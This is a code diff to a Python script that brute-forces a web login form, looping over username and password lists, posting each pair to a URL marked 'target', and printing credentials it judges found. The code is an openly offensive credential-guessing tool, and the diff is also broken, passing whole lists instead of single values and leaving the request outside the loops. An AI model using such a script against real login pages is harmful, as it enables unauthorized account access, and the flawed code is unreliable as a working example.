@@ -1,4 +1,5 @@
 import requests
+from colorama import Fore
 
 # Got POST Form Type
 # Copied As Curl
@@ -33,8 +34,20 @@ for password in passwords:
       'submit': 'Connexion'
 }
 
+for user in users:
+    data = {
+      'username': users,
+      'password': passwords,
+      'submit': 'Connexion'
+}
+
 response = requests.post('http://grabme.herokuapp.com/target/', headers=headers, cookies=cookies, data=data, verify=False)
 
 # Checking Response To Get Correct Password.
-if "incorrect username or password" not in response.text:
-    print("Password Is Likely Found: ", password)
+if "incorrect username or password" in response.text:
+    print(Fore.RED + "Failed! Trying Next Credentials...")
+
+else:
+    print(Fore.GREEN + "Credentials Are Likely Found: ")
+    print(Fore.GREEN + "Username: ", user)
+    print(Fore.GREEN + "Password: ", password)
